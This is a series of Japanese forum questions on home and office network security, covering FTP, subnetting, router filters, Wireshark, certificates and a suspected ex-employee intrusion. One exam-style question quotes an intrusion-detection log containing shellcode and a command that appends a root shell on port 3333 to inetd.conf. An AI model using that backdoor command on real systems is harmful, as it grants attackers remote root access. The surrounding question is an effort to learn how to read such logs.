いつも勉強させて頂いております。 現在FTPの危険性について調べているのですが、いまいちピンと来ません。 調べてた結果、私なりに次の様な理由で危険である、と理解したのですが、詳しい方がいらっしゃればご意見いただけますか？ インターネットにつながっているパソコンでは、セキュリティソフトやブラウザ、windows update等の様々なインターネットへ接続が必要なサービスが動作している。 それぞれは複数あるポートと呼ばれる入口をそれぞれ専用で使ってインターネットと接続している。このポートは通常ファイアーウォールで守られているため、外部からこのポート経由でPCへアクセスできないようになっている。(1) FTPはポート20,21を使ってデータのやりとりを行っている。例えばサーバーにファイルをFTPで転送する場合は、転送の間、自分のPCのポート20,21がファイアーウォール対象外となり、データを転送するが、その間そこを狙われる可能性がある。(2)また、FTPは平文で通信するため、サーバーへ行くまでに経由するPC上でその通信を傍受される可能性がある。(3) 疑問なのが、(1)～(3)です。 (1)について データを送ったりアクセスを試みるとき、IPアドレスを指定するものだと思っていました。これに加えて、ポートスキャンを利用してアクセスできるポートを調べた上で、ポート何番にアクセスしろ、ということができ、そこからアクセスされる可能性があるのでしょうか？ (2)について FTPで通信をするときはファイルを送る方、受ける方、どちらもポート20,21を使っているのですか？ また、ファイアーウォールが動作していると、ポートにアクセスしようとしてもはじかれる、という理解でいいですか？ファイヤーウォールは中から出る物は許可するが、外から入る物は送り先を判断して許可するかどうか決めているのですか？FTPが危険というのはデータが経由地点で傍受されるのが危険なのか、それともFTPの際に使われるポート20,21からアクセスされるのが危険なのですか？ (3)について よくパスワードが抜かれることがある、と言われますが、FTPでは一回の通信毎にデータ転送先のサーバーのFTPについてのパスワードを平文で送っているからパスワードが抜かれる、ということなのですか？SSHでは通信データは暗号化されているから安全である、という理解でよいでしょうか？また、FTPで真に危険なのは、パスワードを抜かれることでその抜いた人がサーバーにそのパスワードを利用してアクセスすること、という理解でいいですか？ 質問だらけになってしまって情けないですが、詳しい方いらっしゃったら教えて下さい！ よろしくお願いします！
テレビもパソコンも携帯電話もエアコンのリモコンもエアコンもトイレも固定電話もカーナビもハッキング？されたようです。 あなたがもし同じ状況になったら相手の目的はなんだと思いますか？ いくら考えても目的がさっぱりわからないのです。 宗教の敵だからか？違法なことをしたことあるから、そのやりかえしかな？イタズラか？実験か？ その他いろいろ。何の価値もないただの一市民を狙う価値があるとは思えないし、さっぱりわからないです。 あなたの意見を聞かせてください。
倉庫の中でE-mobileのポケットWifiルーター　D25H　＝＝＝　デスクトップPC　＝＝＝　ネットワークカメラ　というようにつながっています．デスクトップPCは無線アダプターでD25Hとつながっており，IPアドレスは192.168.1.1(D25H) 192.168.1.2(PC)です．一方で，このデスクトップPCは有線のイーサネットアダプターを介してネットワークカメラにつながっており，それぞれのIPアドレスは192.168.0.1（PC） と 192.168.0.2（カメラ）としています． 問題は，このようなLAN環境に外部から入り込み，ネットワークカメラにアクセスすることは可能かということです．デスクトップPCにアクセスするには，D25Hのポートフォワーディングで，例えばポート番号80で192.168.1.2にアクセスするようにすれば実現できると思います．しかし，ネットワークカメラとD25Hは同じネットワーク環境に居るわけではなく，192.168.0.2というIPアドレスですので，ポートフォワーディングではアクセスできないと思います． 192.168.0.x系（有線系）と192.168.1.x系（無線系）をデスクトップPCでブリッジ接続し，ポートフォワーディングさせることは可能なのでしょうか？ それとも，もっと便利でよい方法があるでしょうか 具体的には，ネットワークカメラから外部のFTPサーバーに定時画像を定期的に送信するようなことを実現したいと考えています．
通信が非常に遅くなることがあったので分からないながらもWiresharkで通信の内容を覗いてみました。 SorcePortもDestinationPortもunknownポートであるような通信（例：ローカルポート：52401 リモートポート：11869、ローカルポート：1450-1480 リモートポート：12350）があり、IP検索で検索を行ってみてもIPが不正IPであるかが分からないながらもウィルスセキュリティZEROのファイアーウォールで少しづつ影響が出ないかを確認しつつ止めてみています。 前よりも通信速度は上がったと思いますが、激しくアクセスが行われることがありブロックされていても困惑しています。 ウィルスセキュリティZEROでPC全体のウィルスチェックは行いましたがウィルスは検出されませんでした。 ONUとPCの間にブロードバンドルータを置いていますが、機能的に低いのではないかと思ってます。 上記の状態を回避するにはどうすればいいのでしょうか？　もっと性能の高いルータに変えれば変わるのでしょうか？　何度もアクセスしてくるIPアドレスについて相談できるところなどありますか？ ＊家庭用のPCですが、家庭用の質問コーナーでは適切な回答がもらえなかったため詳しい方にお聞きしたいと思い「技術者向」コーナーに投稿します。 よろしくお願いします。
下記の問題がわかりません。 「IPアドレスは192.168.1.0/24を、ルーティングプロトコルはRIPを使用するものとする。」とあるのに、 255.255.255.192や255.255.255.252を使用しているのが？？です。 すべて答えなのですが、なぜこの答えになるのか教えて頂きたいです。 宜しくお願い致します(><) ---------------------------------------- 2台のルータを使用して図のようなネットワークを構築したい。ルータ2ではインタフェースのアドレス設定とルーティングプロトコルの設定が完了している。次に、ルータ1に設定を行いたいのだが、下記のうちどのコマンドを使用すれば良いか。なお、IPアドレスは192.168.1.0/24を、ルーティングプロトコルはRIPを使用するものとする。（3つ選択） ○Router1(config)#router rip Router1(config-router)#version 2 Router1(config-router)#network 192.168.1.0 ○Router1(config)#interface ethernet 0 Router1(config-if)#ip address 192.168.1.65 255.255.255.192 Router1(config-if)#no shutdown ○Router1(config)#interface serial 0 Router1(config-if)#ip address 192.168.1.6 255.255.255.252 Router1(config-if)#no shutdown Router1(config-if)#clock rate 64000
auのスマートフォンのIPアドレス帯域はどこで分かりますか？ドコモとソフトバンクは開発者向けのスマートフォンサイトがありそこで分かるのですが、auはEZfactoryしかなく、スマートフォン向けのサイトが見つかりませんでした。 IPアドレスを使ってアクセス制限を行いたいと思っています。フィーチャーフォン・スマートフォンのみ入れるサイトのアクセス制限です。
不正アクセスがないかを確認していますが、リモートポートがHTTPで使われるポート80の場合は心配しなくてもいいのでしょうか？　詳しい方お教えください。
『192.168.5.80/28は、アドレス範囲が192.168.5.80～192.168.5.95となり、192.168.5.64/27のネットワークと重複してしますため、適していません。』と回答にあります。 192.168.5.80/28のアドレス範囲192.168.5.80～192.168.5.95までは求められましたが、192.168.5.64/27のネットワークと重複しているかの導き方が解りません。 ご教示頂きたいです。 宜しくお願い致します。
192.168.4.34/30と192.168.4.37/30は異なるサブネットワークに属していると 回答にあります。 私が計算すると、異ならず同じサブネットに属しています(><) 答えの導き方を教えて頂けないでしょうかm(_ _)m 宜しくお願い致します。。
2週間前ぐらいから回線が急に悪くなりました。 回線が悪くなる前日までは普通によかったのですが… FEZというゲームをしているのですが，悪くなる前まではPING値は60～90と普通に動ける数値を出していました。 でも，次の日起きてプレイして見るとPING値が300～400を出していました。 一時的なものだろうと思っていたのですが，今日までずっとその調子です。 たまに，60～90辺りもでますがホントに稀で日を増すごとに回線が悪化しているような気がします。 でも，なぜか対戦中は60～90辺りがでるのが不思議です・・・。 FEZが重いのかと思い他のゲームもして見たのですが、そちらもやはり重かったです。 ルーターの再起動やウイルススキャンをしてみたものの変わりません。 ちなみにルーターは4年ほど使っているので寿命がきたのではないかとも思ってます。 CPUは「Intel(R) Core（TM)2 Duo CPU E7500 @ 2.93GHz(2 CPUs) メモリは4096MB　RAM グラボは「ATI　Radeon HD 5400 Series」 です。 理由がわかるのなら知りたいです…。 よろしくお願いします。
Ms Tunnel Interface Driver とは何ですか？ インターフェースの1つではないかと思われますが、これは何もしなくてもPCにインストールされているものなのでしょうか？
こんにちは。 WSUSの設定で必要なだけの更新プログラムやセキュリティパッチをダウンロードしたファイル等をメディアにエクスポートして、別PCに適用するといった方法は可能でしょうか？ 詳しい方がいらっしゃれば、お答えいただければと思います。 よろしくお願いします。
FTPのPUTの質問ですが Win7から別のWin7へtxtファイルをPUTすると、実行されません。 ファイアーウオールを無効にするとＯＫなのですが、 詳細設定でポート20,21を追加してみてもダメです。 ウイルスソフトはありません。 簡単な説明で申し訳ありませんが、何かわかる方教えてください
サーバー証明書について、小学生でも分かるように説明していただけませんか？ ネットで調べても、なぜ必要なのか？どう使われるのか？良く分かりませんでした。 どうぞ、よろしくお願いします。
動画が見たいのでアドビフラッシュプレーヤーをダウンロードしたいのですが、「Time　out....] と表示がでてダウンロードできません 　ちなみに当方のOSはXPです。 ダウンロードの前に(1)サービスパック２のダウンロード　(2)internet explore 9 のダウンロードを完了させたのですが… どうしたらよいでしょうか？ 教えてください
/ index | +---/a（アクセス許可） | +---/b（アクセス拒否） 上記のように/aはアクセスを許可、/bはアクセスを拒否したいと思っています。 .htaccessをindexのあるディレクトリに置いて、/aと/bを制御する方法はありますでしょうか？
私のデスクトップパソコンなんですが、 スペックは NEC VW770/D CORE i5 windows7 64bitです 不具合というのは、先日いつも通りに使用していたところ、いきなり フリーズに似た症状になり、強制終了してもう一度起動すると、添付画像のような 英語の文が出てきて、最後のほうにpress a key とあるので適当におすと、 また同じ文が出てきてpress a key この繰り返しです、その後何故か勝手に直ったのですが、 何度か同じ事が起きているのでウィルスかもと思っています、 詳しい方がおられたらお助け願います。 また、この手の不具合を検出するソフトなどはあるでしょうか？
ルートキットというものがいきなり検出されて困っています。このパソコンでオンラインゲームをしていたことはありますが、三年は前のことなので、今日どこかで入れてしまったのかな？と思います。sfloppy.sysという名前で、二個発見しました。アバスト！の無料セキュリティソフトを使っていて、夕方に検出したのですが、推奨される動作の駆除をしてみても効果がないみたいです。 有料の駆除ソフトを探して入れるなどした方がいいでしょうか？ よろしくお願いたします。
IPアドレスと名前でどこまで自分の住所などがわかってしまうのでしょうか。
社内にある生産設備に付随したPCのOSがMS-DOSだった事が判明したのですが 当然社内標準のセキュリィティソフト、毎月のMSセキュリティパッチがインストールできないまま LANに接続されています。 OSをXP、7に変更すれば良い事はわかっているのですが 設備上すぐ実施できないのが現状です。 この様なPCの管理方法、またMS-DOSを使い続けると発生するリスクは何でしょうか？ そもそもMS-DOSの様な古いOSにもウィルスの脅威はあるのでしょうか？ 宜しくお願い致します。
ホームページの暗号化はHTTPS と アドレスのプロトコル部分にSがついてるかどうかで 判断できますが、受信メールの場合 どこをみれば、そのメールが暗号化されてるかどうか 分かるのでしょうか。 できれば、どんなメーラーでも共通する方法がいいです。
私のPCはウイルスバスターを使っているのですが、 １か月前くらいから、 windowsを起動をするたびにブラウザ ヘルパーオブジェクト(BHO)シールドの警告がでます。 消したいのですが、やり方がわかりません・・・ どなたかわかる方 助けてください！！
よく使うパスワード認証やバイオメトリクスのなりすましについて気になっています。 大体どれくらいの確率でなりすましがされてしまうのでしょうか？ 感覚ではなく、どこかで調査されているものを見てみたいです。 よろしくお願いします。
WAN側からのプライベートアドレスやループバックアドレス等を偽装したパケットをルーターのフィルタで拒否する設定方法を教えてほしいです。 WAN側からのアクセスだけでなく外に出ていくパケットも遮断したいのですが上手くいきません。 ルーターはAtermのWD701CVでアドレスは192.168.0.1に設定しています。 10.0.0.0/8**** 172.16.0.0/12**** 192.168.0.0/24**** 127.0.0.1**** これらのアドレスを拒否すれば良いというのは分かるのですが、外に出るパケットを遮断すると接続に不具合が出ました。 いくつかのアドレスは両方向で遮断しても問題はありませんでしたが 172.16.0.0/12**** 192.168.0.0/24**** このどちらかを両方向で遮断するとネットすら接続できなくなってしまいました。これとは別に特定のパケットを許可する設定も必要なのでしょうか？ どなたか教えてください。
windows7 32bitに変更したのですが　インターネット接続ができなくて困っております。 マウスコンピューターというのは分かっているのですが なにぶん初心者ですので何をしたら良いのか分からず困っております いろんなサイトを見て回りわかったこととして、 イーサネットコントローラー ＰＣＩシンプル通信コントローラー ＳＭバスコントローラー ＵＳＢコントローラー が無効になっていることです。 もともとローカルエリア接続だったのですが　接続しようとしても　使用可能な接続はありません　と 右下に出てきております どなたか初心者にも分かる回答お願いします。　あと、型番などの見方も教えてくださるとありがたいです。
先日、オフラインでのセキュリティパッチの適用に関して質問させていただきまして、 その際にWSUSのことを教えていただきました。 その後、自分で調べてみたのですが、よくわからなかったので知っている方がいらっしゃれば 教えてください。 WSUSを利用して、オフライン環境にあるクライアント端末に最新セキュリティパッチを適用できる ようにしたいのですが、うまく適用できる方法はないでしょうか？ ※IEやサービスパックは適用しません。 よろしくお願いいたします。
お世話になります。 netsession win.exe が時々受信され、ウイルスソフトに引っかかり止まっています。 メール発信元は、Akamail Technologies,Inc となっており、Internet Explorerの設定変更するとの表示が出ますが、これは具体的に何をするソフトでしょうか？ インストールして問題ないソフトでしょうか？ このソフトのメリット・デメリットを教えて下さい。
postfixにport２５を利用して、WANからメールを送信しようとするとメールが送信できません。ためしにpostfixのportを26へ変更し、ルータのポートの26を開放するとメールが送信できました。 環境として、サーバがubuntu 11.04. ルータがWHR-G301Nです。 何か知っておられる方がいらっさればご回答をお願いします。
最新版をダウンロード中「ＯＳに最新のServicePackを適用して下さい」という表示が出てしまったのですが、トレンドマイクロ社のＨＰではプロバティで確認を（私のはServicePack ２でした）としか書いてありません。最新にダウンロードをすれば良いのでしょうか？適用方法を教えてください。宜しくお願いします。（因みに現在まで使用中だったウイルスバスター２０１１は11月30日で期限が終了）
Windows2008R2のフォレストドメインコントローラのネットワークの種類が ドメインネットワークになりません。 ドメインに参加している場合、 「ネットワークと共有センター」の「アクティブなネットワークの表示」で 「ドメインネットワーク」から変更されないはずなのですが、 「社内ネットワーク」や「パブリックネットワーク」が選択できてしまいます。 ドメインネットワークに設定したいのですがどうすればよいでしょうか？ 以下、こちらで確認した関係のありそうなことです。 ・「グループポリシー管理エディター」 → 「ネットワークリストマネージャーポリシー」では 最初表示されず、右クリック → 「すべてのネットワークを表示」 （表現を覚えていないため表記が違うかもしれません） だと表示されます。 ・デフォルトゲートウェイはインターネット用ルーターに設定してあります。 （デフォルトゲートウェイの設定が正しくないと現象が起こることがあると聞いたためです。） 以上、よろしくお願いします。
社内にWEBサーバを立てて、ＨＰを公開している取引先があります。 取引先より、インターネット回線のプロバイダを変更するんだけど、今後もＨＰは問題無く見れるか 聞かれました。 ここからは私の想定ですが、 プロバイダを変更するという事は、グローバルＩＰが変更になる。 ＩＰが変更になると、ＤＮＳの設定を変更しないと、名前が解決出来なくなるのではと 思っています。 一般的に、ＤＮＳの登録はプロバイダが行っているのでしょうか？ 取引先への回答は、上記のような事を説明した後、プロバイダに 問い合わせてください。 という回答で問題ないでしょうか。 よろしくお願いします。
教えてください。 同じセグメントIPを持つサーバが2台あります。 夫々は各HUBに繋がっていて仮にサーバA、サーバBとします。 又それらにアクセスするPCは別のセグメントにいます。 それらの中心にはNATルータを置いて通常時はサーバA、問題が生じた場合はサーバBに切り換える事想定しています そんな条件で購入を検討した場合、安価で且つ安定したルータはどういう製品になるのでしょうか？ お教えください。
現在wiresharkで数十台のクライアント端末をサーバに接続させる通信テストを行っているのですが、この中の1台の通信が切れたりしているので、その原因の解析のためにwiresharkでパケットをキャプチャしているのですが、この端末を特定するためにこの端末が出力しているパケットを特定したいのですが、どのようにしたら良いでしょうか?この端末のパケットのデータには必ず00 1e 88 00というデータが入っているのですが、これをフィルタする方法を教えて下さい。お願い致します。 ちなみに、data matches 001e8800 というフィルタ条件を作ったのですが、これでは検索できませんでした。
すいませんが、あまり詳しくないですのでお教え頂ければと思います。 現在2台のPCを使用しています。 ネット回線はADSLです。 それぞれのPCでネットを利用する時は ルーターからのLANケーブルを それぞれ外したりつけたりして、都度PCのLAN接続をしております。 ハブを使ってルーターと2台のPCが常時LANケーブルで繋がれて いるのではなく、ネットを繋ぐときだけ、それぞれLANケーブルを挿して 使う形です。 この場合、1台のPCにウィルスが感染した場合、もう１台のPCもその影響 で感染することは考えられるものでしょうか？ 同じプロバイダーの回線でもし上記で感染する可能性があるのでしたら ２つのプロバイダー契約をして、２台それぞれが違うプロバイダーの回線を 使用してネットをすれば、２台のPC下で１方が感染しても１方は感染しない （ネットを繋ぐことでの）と考えてよろしいでしょうか？ 宜しくお願いいたします。
Niftyの旧バージョンのWebメールを使っています。 PCはWindowsXPです(両方とも）。 これまでは、作ったアイコンをクリックすれば受信箱を一発で開くように設定できたのですが、 もう一つのPCでは、ログイン画面が出てきて、IDとパスワードを入れなければならず、不便で仕方ありません。 Niftyに問い合わせたところ、そういう設定を紹介することは出来ません、と言われました。 セキュリティーの問題なのでしょうか・・・。 これまでのPCのように設定できる方法がありましたら教えてください。 また、新バージョンになると無理でしょうか。 よろしくお願いいたします。
元になる文字列を【~>o5xJN/】とした時、 以下の質問で作成するパスワードの強度について教えてください。 質問1、途中途中に元のコピーを挟む場合 【~【~>o5xJN/】>o5x【~>o5xJN/】J【~>o5xJN/】N/】 質問2、単純に【~>o5xJN/】のコピーを繰り返した場合 【~>o5xJN/】【~>o5xJN/】【~>o5xJN/】【~>o5xJN/】 質問3、先頭から一定の法則でコピー範囲を広げていった場合 【【~【~>【~>o【~>o5【~>o5x【~>o5xJ【~>o5xJN【~>o5xJN/【~>o5xJN/】 ちなみに3つとも総当たり攻撃と辞書攻撃を 想定したチェッカーで試してみたところ高得点となりました。 総当たり攻撃と辞書攻撃以外での解析方法については知らないのですが、 解析途中で規則性を見つけるツールも存在するのでしょうか？
オークションにて、安くRTX1100を手に入れたのですが、 フィルタ設定について不安が残ります。 (現在、PPPoEと、VPN設定はなんとか設定できて、運用しています) ヤマハ サイトのこの辺りをみて丸パクリで、フィルタ設定を書きました。 http://jp.yamaha.com/products/network/solution/v … 外部からポートスキャンかけた所、25, 80, 110, 143ポートが開いていると 結果が返ってきます。 サーバは一切公開していないので、上記ポートを閉じたいのですが、 in フィルタで、「ip filter 2000 reject * *」となっているため、 閉じられていると思うのですが認識が間違っていますか？ 現在の設定は以下です。 pp select 1 ip pp secure filter in 1020 1030 1040 1041 2000 ip pp secure filter out 1010 1011 1012 1013 1014 1015 3000 dynamic 100 101 102 103 104 105 106 107 ip filter source-route on ip filter directed-broadcast on ip filter 1010 reject * * udp,tcp 135 * ip filter 1011 reject * * udp,tcp * 135 ip filter 1012 reject * * udp,tcp netbios_ns-netbios_ssn * ip filter 1013 reject * * udp,tcp * netbios_ns-netbios_ssn ip filter 1014 reject * * udp,tcp 445 * ip filter 1015 reject * * udp,tcp * 445 ip filter 1020 reject 192.168.0.0/24 * ip filter 1030 pass * 192.168.0.0/24 icmp ip filter 1040 pass * 192.168.0.254 udp * 500 ip filter 1041 pass * 192.168.0.254 esp ip filter 2000 reject * * ip filter 3000 pass * * ip filter dynamic 100 * * ftp ip filter dynamic 101 * * www ip filter dynamic 102 * * domain ip filter dynamic 103 * * smtp ip filter dynamic 104 * * pop3 ip filter dynamic 105 * * netmeeting ip filter dynamic 106 * * tcp ip filter dynamic 107 * * udp すみませんが、ポートの閉じ方を教えて頂けますでしょうか。
http://oshiete.goo.ne.jp/qa/7134769.html この質問の続きです。 証明書会社に、フレンドリ名を追加してくれと頼んだら、 当社の証明書をインストール（証明書の要求の完了）をする前に、 前段階の手順として、「証明書の要求の作成」をしてくれと言われました。 そこで、証明書の要求の作成で、証明書を作った後に、 証明書会社の発行してくれた証明書をインストール（証明書の要求の完了）をしたら、 エラー内容が変わりました。 「この証明書ファイルに関連付けられた証明書の要求が見つかりません。 要求を作成したコンピュータで、証明書の要求を完了する必要があります。」 ここで、また躓きました。 某サイトの情報によると、上記エラーが出ても、サーバー証明書のインストールが完了しています。 との情報もあったのですが、サーバー証明書の一覧に証明書が出てきません。 つまり、インストールが完了していないと思われます。 証明書会社では、これ以上の対応はわからないので、 IIS販売業者様へ問い合わせろとの回答でした。 つまりは、マイクロソフトに問い合わせなさいってことなんでしょうけれど、 マイクロソフトのサポートってどこにあるのやら…… WindowsXP,Vista,7のサポート（及びOfficeのサポート）は見つけたけれど、 WindowsServerのサポート（またはIISのサポート）は見つかりません。 どなたか、解決した人 or マイクロソフトに問い合わせる方法がわかる人は、 回答をください。とても困っています。
BTOパソコンを購入して、ubuntuで自宅サーバをたてたのですが、ネットワークの接続が不安定です。 時間がたつと勝手にネットワークにつながらなくなります。 このような現象の解決方法を知っている方、教えていただけないでしょうか。 回復方法としては現在は再起動しか思い当たっておりません。 お手数をおかけします。 宜しくお願いします。
WireSharkで現在作成している端末のTCPパケットを1時間ぐらいキャプチャしました。この1時間の間に3回ぐらい10分程度無通信状態の時間帯があるんですが、その時間を忘れてしまいました。この時間帯を検索したいのですが、ログの量が多すぎて見つけるのが難しくて困ってます。Filter検索とかで何時何分のパケットだけ表示する方法は無いでしょうか?
はじめまして、小さな会社のＰＣを担当しているＰＣ初心者なのですが、かなり困っています。 最近辞めた社員（仮にＡとします）が会社のＰＣ（10台あり、お互いを簡単なネットワークで 繋いでいます）に外部からアクセスし、情報を見ている可能性があると報告を受けました。 辞めたＡは、それなりにＰＣに詳しく、既存の環境は全てＡが作成したものとなっており、 現在はそれをそのまま引き継いだ形となっております。 ＢＵＦＦＡＬＯのリンクステーションというハード機器を全ての情報の保存場所として使っており、 全ての社内情報はその中で、各ＰＣからリンクステーションに接続して情報を得、 共有しているといった環境です。 どうして外部アクセスの疑いがあるとわかったのかと言いますと、 最近Ａから新規の仕事の取引依頼があり、その内容にＡが辞めた以降の新規顧客の情報 が話の中ふんだんに入っていたとの事で、これはおかしいと報告が上がったのです。 そんな訳で、ＰＣ間の既存のネットワークは出来ればそのままに、 社内のＰＣ以外のリンクステーションへの接続は出来ない様にするような、 また社内のＰＣも外部からのアクセスは一切はじく、 という様な防御が出来ればと考えておりますが、あまりよくわかっていない為そのような事が 出来るのならばぜひ教えて頂けたら、と思います。 贅沢ではありますが、なるべく簡単な方法で・・。 Ａもそこまで専門ではないだろう為、それなりに必要なブロック、で検討したいのですが・・。 ネットで調べたところ、専門の業者さんと専用のハード機器を入れたら 50～1500万かかると書かれており、とてもですが出せません。 ですので、金銭面については、出来るだけ安価でお願いしたいのですが・・。 あと、私自身初心者の為、ソフト等で簡単にできる、とかでしたら非常にありがたいのですが・・ 環境は、ＰＣは９台がウインドウズＸＰｓｐ3で、１台だけウインドウズ７です。 ＮＴＴのフレッツ光のインターネットサービスを利用しており、モデムからルーターに行って、 ルーターからハブで全てのＰＣに繋いでいます。 全ＰＣにウイルスバスター2011クラウドを使用していましたが、使っている社用ソフトが 不具合を起こしたりＰＣが異常に重くなったりインターネットが非常に重くなる為、 現在は使っていません。 何か良い方法があれば、どうぞお知恵をお貸しいただければと思います。 どうぞよろしくお願いします。
HSRPを構成している、 2台のCisco Catalyst L3スイッチがあります。 今回、OpenViewなどのNMS（ネットワーク管理マネージャ）を 導入するのですが、HSRPで仮想IPがStandby系に移った際に、 それがSNMPトラップとして、NMSに検知されるか、検証したいと考えています。 初歩的なご質問ですが、Ciscoで仮想IPをStandby系に移す コマンドなどはありましたでしょうか？。 またSNMPトラップを発生させるには、 コマンドではなく、ケーブルを抜くなどのイベントが必要でしょうか？。 アドバイスをお願いします。
同じ無線ＬＡＮ親機に複数のワイヤレスネットワークが設定されています。 以下のような感じです。 Ａ．WARPSTAR-****** B．WARPSTAR-###### C．WARPSTAR-######W Aを残してB、Cを削除する方法を教えてください。 表示しないようにするのではなく、削除したいのです。 使用無線ＬＡＮはＡｔｅｒｍのＷＲ１２００Ｈ、ＯＳはＸＰ、ＰＣはＦＭＶ－Ｒ８２７０です。 よろしくお願いします。
はじめまして よろしくお願いいたします。 ブログを「全員に公開」しようとするとブロックがかかってしまいます。 黄色い星のようなマークが出てしまい、何かブロックされているようなのですが、 なんだかわからずに困っています。どうかよろしくお願いいたします。PCはwindows7です。
最近ウィルスバスター2012に更新して以来なのか、それ以前に問題なく使用していたワイヤレスでのプリンター（Ｅｐｓｏｎ　503 A)が使用できなくなりました。 アクセスポイントで使用しているルーターとプリンターとの接続状況は正常です。 たぶんセキュリティの設定の仕方が問題なのでしょうか。もう粘っていろいろ試してみましたが、うまくいきません。どなたか助けてください。。。
公開鍵暗号方式・共通鍵暗号方式があるのはわかっているのですが、 共通鍵暗号方式では、送信者・受信者共に同じ鍵を使うため、同じアルゴリズムで暗号化・復号を行うのであろうと予想はつくのです。 (DESや3DESがあると思うのですが、多分共通鍵にDESを使うとかかいてある？) ・質問 公開鍵暗号の場合、 AがBにデータを送る際、Bの公開鍵でデータを暗号化すると思うのですが この時、Bの公開鍵(証明書？)に、RSAで変換　といったことが書かれているのでしょうか？ 公開鍵暗号には、楕円曲線暗号、ElGamal暗号があると思うのですが、 もし、Bの公開鍵に、暗号方式が書いていないと、Bの秘密鍵がRSAだった場合復元できなくなってしまうと思うのですが・・・。 初歩的な質問ですみませんが、 どなたかご教授いただけないでしょうか？
あるネットゲームをしているのですが、そのネットゲームの更新を使用とすると・・・ SONAR保護機能で、更新内容の一部が削除されてしまうのですが、どうしたらよいでしょうか？ 現在、ノートンの「SONAR保護」をオフにすると更新がうまくいくので・・・ そのネットゲームを更新する際だけ、一旦ノートンの「SONAR保護」をオフにしてやっています。 非常に不便で困っています。 ちなみに、ネットゲームなどする際、ノートンの「SONAR保護」をオフにしたままでも大丈夫でしょうか？ そもそも、ノートンの「SONAR保護」とは、何を保護する機能なんでしょうか？ 以上、質問は３点です。　何方か、できれば詳しく教えて下さいませ。 私は、セキュリティに関して無知なもので。　宜しくお願いいたします。
YAMAHAのRTX1500で本社と支店をVPN接続しています 本社にファイルサーバー（192.168.1.200）があり支店はそれを見に行くようにしていますが 支店から本社を見に行った場合192.168.1.200以外は見にいけないように設定したいのですが どのような方法があるのかまったくわかりません たとえば（本社）192.168.1.13のパソコンがあり共有がかかっていた場合VPN越しに支店側から \\192.168.1.13と打ち込まれるとそのパソコンが見えてしまうのでフィルター？アクセス制限？的なことができきればと思います お詳しい方いればぜひアドバイスいただければ助かります 本社　192.168.1.1 支店１　192.168.10.1 支店２　192.168.20.1 支店３　192.168.30.1
家で一人づつパソコンを持った場合 回線は皆一緒ですが一台にウイルスに感染したら他のパソコンにもウイルスに感染しやすくなるのでしょうか？ 感染しやすくなる場合 その理由を教えて下さい。 宜しくお願いいたします。
ZAQでインストールを推奨しているマイシールドというセキュリティをインストールしてからPCの動作が非常に遅く困っています。それでもネットアクセスできていたのですが、あまりに重いためリアルタイムウィルススキャンを無効にして使っています。 ところが最近ネットにアクセスしているとだいたい１時間くらいで突然画面が真っ白になり強制終了するしかない状態になります。その後ＬANケーブルをつないだまま立ち上げても立ち上がらず、ＬＡＮケーブルをはずして立ち上げると問題なく作動します。ＬＡＮを繋いでいない時は順調です。 やはりマイシールドが重すぎるのが問題でしょうか？ ＪＣＯＭ技術サポートに相談すると、マイシールドは今のＰＣ環境で問題なく作用するはずだと言われましたが、他に思い当たる原因がなく困っています。同様のトラブル経験された方いませんか？ PC環境 Windows XP Home edition. SP3. 　IE6　　256M 1.5GHz
あるセキュリティの問題で全くログの読み方がわからないので、 わかる人がいたら教えて下さい。 ・NIDSにおいて、バッファオーバーフロー攻撃の検知により生成されたログがある。 　この攻撃は何か？ ここからログの内容 0000000000000000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000000000000000 000bffff7040000000000000000000000000000000000000000000000bffff7050000bffff70 6000000000000000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000bffff707<90><90><90><90><90><90><90><90><90><90> <90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90> <90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90><90> k^<89>v<83><8D>^(<83><89>^<83><8D>^.<83><83><83>#<89>^1<83><88>F'<88>F*<83> <88>F<89>F+,<89><8D>N<8D>V<80>1<89>@<80> /bin/sh.-c echo 3333 stream tcp nowait root /bin/sh sh -i >> /etc/inetd.conf;killall -HUP inetd １．バックドア用ポートの追加 ２．バックドア用ユーザアカウントの追加 ３．OS上のrootパスワードの変更 ４．既存サービスのポート番号の変更 ５．root権限でのリモートアクセス 答えは１番と５番ですが、その理由が全くわかりません。 よろしくお願いします。
ASP.NETでBASP21を使用してメール送信のプログラムを作成しました。 現在、お客様の環境で、送信でエラーになるアドレスが何件かあり、困っております。 現状として。。。 (1)送信できないアドレスへOutLookからは送信可能。（お客様環境） (2)送信先のアドレスだけ変更すると送信可能。（お客様環境） (3)送信できないアドレスへ開発環境からは送信可能。（社内環境） お客様の環境は以下の通りです。 ・回線はNTT ・プロバイダはOCN ・SMTPサーバはレンタルのサーバ いろいろ切り分けの為の調査を行っておりますが、 ここでは、回線とプロバイダが違うことで送信エラーとなることがあるのか、をご質問させてもらいたいと思います。 その他、気になること、助言などございましたらよろしくお願いします。
MZK-MF150／mediatombでのメディアサーバ構築 DLNAクライアントから、メディアサーバを認識できず、悩んでいます。 現在、下記の構成で自宅にメディアサーバを構築しようとしております。 |有線 /無線 マンションLAN | 無線LANルータ（192.168.1.1） / MZK-MF150（192.168.1.120）（コンバータ） | Linuxマシン（メディアサーバ：mediatomb）（192.168.1.27） この状態で、iPodを用いて、DLNAクライアントソフトの『MLPlayerLite』を使い、DLNAサーバの検索をしても mediatombを認識できません。 無線で接続したwindowsマシンで、windows用のDLNAクライアントソフトを用いても同様です。 しかし、ブラウザにてmediatombで指定しているポートを含め『http://192.168.1.27:50500』にアクセスすると mediatombの管理画面を表示することはできます。 構成を、下記のように有線で接続すると、DLNAクライアントソフトでも認識するようになりました。 マンションLAN | 無線LANルータ | Linuxマシン（メディアサーバ：mediatomb） しかし、部屋をまたいでの有線接続はしたくないため、どうしても無線での接続にしたいと思っております。 上部、無線接続環境でメディアサーバを認識できるようにしたいのですが、行き詰っております。 有識者の方がいらっしゃいましたら、設定箇所についてご助言戴ければと思います。 【備考】 MZK-MF150（PLANEX製） 無線LANルータ（コレガ製） Linuxマシン（Fedoracore14） ・Linuxサーバ inet addr:192.168.1.27 Bcast:192.168.1.255 Mask:255.255.255.0 ・コンバータ設定値 Local IP Address 192.168.1.120 Local Netmask 255.255.255.0 Default Gateway 192.168.1.1 Internet Primary DNS 192.168.1.1 --- 192.168.1.1 ping statistics --- 5 packets transmitted, 5 received, 0% packet 